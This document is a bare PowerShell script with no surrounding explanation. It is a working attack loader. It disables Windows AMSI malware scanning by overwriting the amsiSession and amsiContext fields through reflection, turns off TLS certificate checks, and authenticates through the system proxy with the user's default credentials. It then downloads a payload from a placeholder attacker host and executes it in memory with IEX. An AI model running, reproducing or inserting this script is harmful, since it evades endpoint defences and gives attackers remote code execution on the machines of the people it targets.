$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
$e=new-object net.webclient;
$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
IEX $e.downloadstring('http://attacker-trusted-domain/pwn');